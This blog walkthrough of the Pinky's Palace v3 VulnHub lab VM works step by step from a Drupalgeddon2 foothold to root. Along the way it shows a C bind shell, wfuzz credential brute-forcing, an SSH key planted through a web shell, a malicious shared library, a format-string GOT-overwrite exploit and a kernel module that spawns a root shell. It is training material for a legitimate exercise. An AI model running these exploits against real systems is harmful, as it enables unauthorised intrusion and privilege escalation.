@@ -1,0 +1,420 @@
+
+
+Shells, Shells Everywhere
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+23 Aug 2018
+
+
+
+16 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Pinkyâs Palace: v3, a boot2root VM created by Pink_Panther, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+I wished thereâs a backstory to the VMâitâll make it a little more interesting. Having said that, the previous two VMs were challenging, fun, and provided plenty of learning opportunitiesâno backstory no big deal.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
+...
+PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             173 May 14 17:37 WELCOME
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.30.128
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+5555/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey:
+|   2048 80:52:6e:bd:b0:c4:be:0a:f2:1d:3b:ac:b8:47:4f:ee (RSA)
+|   256 eb:c8:76:a4:cf:37:6f:0d:5f:f5:48:af:5c:29:92:d9 (ECDSA)
+|_  256 48:2b:84:02:3e:87:7b:2a:f3:91:11:31:0f:98:11:c7 (ED25519)
+8000/tcp open  http    syn-ack ttl 64 nginx 1.10.3
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: nginx/1.10.3
+|_http-title: PinkDrup
+
+SSH is at 5555/tcp while Drupal 7 is running behind 8000/tcp. In any case, letâs check out the FTP since I can log in anonymously.
+Passive FTP
+First up, I notice active FTP is not working.
+
+Letâs try again, this time using passive FTP.
+
+Notice something interesting? Thereâs a directory with three dots.
+Well, letâs get the WELCOME message and see what it has to say.
+
+Fair enough. Now, letâs dig deeper.
+
+No wonder active FTP is not workingâthe VM is unable to start outbound connectionsâthe firewall blocks it.
+Drupal 7
+Next, letâs focus our attention on Drupal 7. Iâm sure you are aware that Drupal versions before 7.58, 8.3.9, 8.4.6 and 8.5.1 is susceptible to a remote code execution attack known as âDrupalgeddon2â.
+
+I know the right exploit for this. Check out EDB-ID 44449. If everything goes well, I should have a low-privilege shell. Letâs do this.
+My first attempt didnât go well. The script needed a slight modification.
+drupalggedon.rb
+...
+# Add this function
+def http_get(url, payload="")
+  uri = URI(url)
+  request = Net::HTTP::Get.new(uri.request_uri)
+  request.initialize_http_header({"User-Agent" =&gt; $useragent})
+  request.body = payload
+  return $http.request(request)
+end
+...
+# Change to http_get for the checks
+url.each do|uri|
+  # Check response
+  response = http_get(uri)
+
+Letâs run it.
+
+I get a low-privilege shell.
+Low-Privilege Shell Redux
+I donât know about you but I like me a proper shell. Remember the firewall blocks outbound connections? Because of that, Iâll have to upload a bind shell instead.
+With that in mind, letâs write a 32-bit bind shell in C (pinky-palace is running 32-bit Debian 9.4). The bind shell takes a port number as its argument in case I need to reuse it on different ports.
+bindshell.c
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char* argv[]) {
+
+  int host_sock = socket(AF_INET, SOCK_STREAM, 0);
+
+  struct sockaddr_in host_addr;
+  host_addr.sin_family = AF_INET;
+  host_addr.sin_port = htons(atoi(argv[1]));
+  host_addr.sin_addr.s_addr = INADDR_ANY;
+
+  bind(host_sock, (struct sockaddr *)&amp;host_addr, sizeof(host_addr));
+  listen(host_sock, 0);
+
+  int client_sock = accept(host_sock, NULL, NULL);
+  dup2(client_sock, 0);
+  dup2(client_sock, 1);
+  dup2(client_sock, 2);
+
+  execve("/bin/bash", NULL, NULL);
+}
+
+Compile bindshell.c for the 32-bit platform. If you are running a 32-bit GNU/Linux distribution, then you can drop the -m32.
+# gcc -m32 -o bindshell bindshell.c
+
+Compress it with gzip and convert it to the hexadecimal representation with xxd.
+# gzip -c &lt; bindshell &gt; bindshell.gz
+# xxd -p bindshell.gz | tr -d '\n' &amp;&amp; echo
+
+Reverse the process over at the fake shell.
+&gt; echo 1f8b...0000 &gt; /tmp/bindshell.gz.hex
+&gt; xxd -p -r &lt; /tmp/bindshell.gz.hex &gt; /tmp/bindshell.gz
+&gt; gunzip -c &lt; /tmp/bindshell.gz &gt; /tmp/bindshell
+&gt; chmod 755 /tmp/bindshell
+&gt; /tmp/bindshell 4444
+
+Connect to the bind shell with nc and spawn a pseudo-TTY.
+
+Now that Iâve a proper shell, letâs find out what else the VM has to offer. I soon discover that pinksec is running two instances of Apache at 80/tcp and 65334/tcp on the loopback interface, i.e. 127.0.0.1.
+Hereâs how to determine:
+
+check ps auwx and notice that pinksec is running Apache
+check netstat -lunt and notice that the loopback interface is listening on 80/tcp and 65334/tcp.
+confirm the above observations with Apache configuration
+
+
+
+Notice that the server admin is pinkyadmin and the two VirtualHosts have different DocumentRoots?
+Lucky for us, socat is available on the VM; I can use it to perform port-forwarding, and since non-root users are able to open high ports (above 1024), letâs do something like this.
+$ socat tcp-listen:4480,fork tcp:127.0.0.1:80 &amp;
+$ socat tcp-listen:4488,fork tcp:127.0.0.1:65334 &amp;
+
+Sweet. I can access both instances.
+
+
+Let the Fuzzing Begin
+Itâs time for a round of fuzzing to determine the directories and files for further exploration. As usual, my weapon of choice is wfuzz combined with quality wordlists.
+For /home/pinksec/html, Iâm going with SecListsâ quickhits.txt. Hereâs what wfuzz found.
+# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.30.129:4480/FUZZ
+Total requests: 2371
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000918:  C=200      0 L	       0 W	      0 Ch	  "/config.php"
+001505:  C=200      0 L	       6 W	     45 Ch	  "/login.php"
+001959:  C=200    221 L	     507 W	  12991 Ch	  "/server-status/"
+
+Total time: 3.857244
+Processed Requests: 2371
+Filtered Requests: 2368
+Requests/sec.: 614.6874
+
+For /home/pinksec/database, since it has something to do with database, Iâm going with sqlmapâs wordlist, common-tables.txt for common tables names; and SecListâs web-mutation.txt for uncommon extensions. Hereâs what wfuzz found.
+# wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZFUZ2Z
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.30.129:4488/FUZZFUZ2Z
+Total requests: 146916
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+082167:  C=200     18 L	      18 W	    221 Ch	  "pwds - .db"
+
+Total time: 268.0692
+Processed Requests: 146916
+Filtered Requests: 146915
+Requests/sec.: 548.0524
+
+Letâs check out pwds.db.
+
+Looks like a password list. More fuzzing??!!
+Letâs take stock of what we know so far:
+
+username: pinkyadmin
+
+password: pwd.dbs (18 candidates)
+PIN: 5-digit (105 or 100,000 candidates)
+
+You can generate a list of 5-digit PINs with a command like so.
+# seq 00000 999999 &gt; pins.txt
+
+All in all, we have 1,800,000 possible combinations, which is still manageable. Letâs give it a shot with wfuzz again.
+FMLâwfuzz took almost an hour to exhaust all the combinationsâno result whatsoeverâthen it dawned upon meâpinkyadmin wasnât the username. 
+I have to think of an alternative fast. Recall the user on Drupal 7 was pinkadmin. Perhaps this is the correct username?
+
+Letâs try again, using pinkadmin as the username. Letâs hope I have better luck this time.
+# wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&amp;pass=FUZZ&amp;pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.30.129:4480/login.php
+Total requests: 1800000
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+1355850:  C=302      0 L	       0 W	      0 Ch	  "AaPinkSecaAdmin4467 - 55849"
+
+Total time: 3549.939
+Processed Requests: 1800000
+Filtered Requests: 1799999
+Requests/sec.: 507.0508
+
+Boom. I got it this time.
+PinkSec Control Panel
+The credential is correct (pinkadmin:AaPinkSecaAdmin4467:55849). After logging in, I got redirected to this.
+
+Sweet. I can execute commands through this web shell.
+
+Time to get shell for pinksec. Letâs generate a SSH keypair on my local machine and transfer the public key to /home/pinksec/.ssh/authorized_keys like so.
+
+Execute the following command in the web shell.
+mkdir /home/pinksec/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbTLpnI4gWcXU6GiD3VjMSSv6n5tEkeHvucJNpYnlRzaKnrmS9R+HEgNi5T7uNbTpI1W9YNrXWKrxpKiGkiMkZCzZw1bU0IDXUX5CgMF3TxZyrbgMZTETd3bu9T68XHU0XD8XmK+qFN8JiWRpzH3bNksPoZliRI1mhM5ucF2BguCe8d6Gki7D/KBJx4j125jrckJ8BEttmVSujyJx+MA/13yPpDz4M9Rx2OH68xmeWET5ZgmDeGFQLqDFYiB+let9t3jZEetEdd+VpdbSK8wrac6X1QcDH436Fp3hiDNOgjHF4P0LDK1GUuxrGxBDHz6InIueI5KNsvxlDlWDZFKU3 &gt; /home/pinksec/.ssh/authorized_keys
+
+Now, SSH into pinksecâs account.
+
+During enumeration of pinksecâs account, I found the following:
+
+
+/home/pinksec/pinksecd is setuid to pinksecmanagement
+
+
+/home/pinksec/pinksecd loads a library at /lib/libpinksec.so
+
+
+/lib/libpinksec.so is world-writable
+
+Armed with this knowledge, I can compile a bogus /lib/libpinksec.so to gain pinksecmanagement privilege like this.
+First, the bogus code.
+libpinksec.c
+#include &lt;unistd.h&gt;
+
+void _init() {
+  execve("/bin/sh", NULL, NULL);
+}
+
+
+Compile the code as a shared library and save it to /lib/libpinksec.so.
+$ gcc -fPIC -shared -nostartfiles -o /lib/libpinksec.so /tmp/libpinksec.c
+
+Letâs execute /home/pinksec/bin/pinksecd.
+
+My effective UID is that of pinksecmanagement. Letâs repeat the same SSH trick, this time for pinksecmanagement.
+
+Copy the public key over to /home/pinksecmanagement/.ssh/authorized_keys like this.
+
+Now, SSH into pinksecmanagementâs account.
+
+During the enumeration of pinksecmanagementâs account, I found the following:
+
+
+/usr/local/bin/PSMCCLI is setuid to pinky
+
+
+pinkysecmanagement group is able to read, write and execute /usr/local/bin/PSMCCLI
+
+
+Format String Vulnerability
+Using pinksecmanagementâs account, I was able to download a copy of /usr/local/bin/PSMCCLI for further analysis. I soon discover /usr/local/bin/PSMCCLI accepts one argument and uses printf to print the argument without using a format string in the argshow function.
+
+The format string vulnerability occurs at the two instructions shown above.
+Letâs examine how we can exploit this vulnerability.
+
+You can see that âAAAAâ appears as â41414141â and âBBBBâ after that as â42424242â. Armed with this knowledge, we can use direct parameter access to read them. But, because the stack is dynamic in nature, any time you push some data onto the stack, you need to reassess the positional parameter of âAAAAâ and âBBBBâ, as youâll see later.
+Now, if we change the parameter from %x to %n, we can write to the memory address specified by âAAAAâ and âBBBBâ, the number of bytes that were output up to the first and second %n.
+OK. Where do we write and what to write?
+If you look at the disassembly of argshow above, right after the vulnerability, the program calls putchar. We could override the Global Offset Table (GOT) of putchar to an address in the stack that contains shellcode. Of course, now we need to determine if the stack is executable.
+Use readelf to look at /usr/local/bin/PSMCCLI.
+
+Good. The stack is executable.
+Next, we need to determine the GOT address of putchar to overwrite.
+Use objdump to look at /usr/local/bin/PSMCCLI.
+
+When the program calls putchar, it JMPs to the address contained in 0x804a01c. What address do we put in 0x804a01c?
+Itâs possible to put shellcode in an environment variable. The beauty of doing soâyou can locate the address of the environment variable with code like this, since itâs located in the /usr/local/bin/PSMCCLIâs stack.
+getenvaddr.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+    char *ptr;
+
+    if(argc &lt; 3) {
+        printf("Usage: %s &lt;environment variable&gt; &lt;target program name&gt;\n", argv[0]);
+        exit(0);
+    }
+    ptr = getenv(argv[1]); /* get env var location */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+    printf("%s will be at %p\n", argv[1], ptr);
+}
+
+
+Iâve chosen a small-sized shellcode that runs /bin/sh. Letâs export the shellcode into an environment variable, say SPLOIT, and run getenvaddr against it like so.
+
+We now have all the ingredients to bake our exploit.
+
+Memory address to overwrite: 0x804a01c
+
+The address to write: 0xbffffedd
+
+
+After you export the shellcode into the environment variable, the positional parameter of âAAAAâ and âBBBBâ changes, in which case they are now the 137th parameter and 138th parameter respectively.
+
+The final exploit looks like this.
+$ /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%65235x%137\$hn%49442x%138\$hn
+
+We use short writes signified by a h before the n format parameter, to write a pair of two bytes (0xfedd and 0xbfff considering little-endian architecture) directly to two memory address using direct parameter access.
+Letâs run the exploit.
+
+Now, we can repeat the same SSH trick shown above to get a proper shell.
+
+Iâve full access to pinky, pinksec, and pinksecmanagement. Now, itâs time to be root.
+Privilege Escalation
+During enumeration of pinkyâs account, this is what I found.
+
+Whoa! Looks like I need to write my own kernel module. I chanced upon this tutorial on invoking user-space applications from the kernel while searching for âkernel module usermode apiâ in Google.
+To that end, I wrote a kernel module that invokes my old bind shell /tmp/bindshell to listen at 9999/tcp.
+root.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+
+int init_module(void)
+{
+  char *argv[] = { "/tmp/bindshell", "9999", NULL };
+  static char *envp[] = {
+    "HOME=/tmp/",
+    "TERM=xterm",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+  return 0;
+}
+
+void cleanup_module(void)
+{
+  printk(KERN_INFO "Goodbye!");
+}
+
+Iâll also need to create a Makefile following the kbuild process like so.
+Makefile
+obj-m += root.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+Now, letâs load the module.
+
+Connect to the shell at 9999/tcp.
+
+Woohoo! Iâm root.
+Letâs do something different. Instead of using the SSH trick, letâs create a phony user account with rootâs privileges.
+
+Open another terminal and SSH to the VM with this credential (toor:toor).
+
+Eyes on the Prize
+Boohoo. Itâs over.
+
+
+Afterthought
+Iâve always been a fan of the Pinkyâs Palace series. This one is as good, if not better than the previous onesâthe systematic approach of privilege escalation from www-data to rootâall the participating âpinkâ characters without missing a beat. And of course the challengesâfuzz to passâformat string vulnerabilityâwriting your own kernel module. I love it all!
+
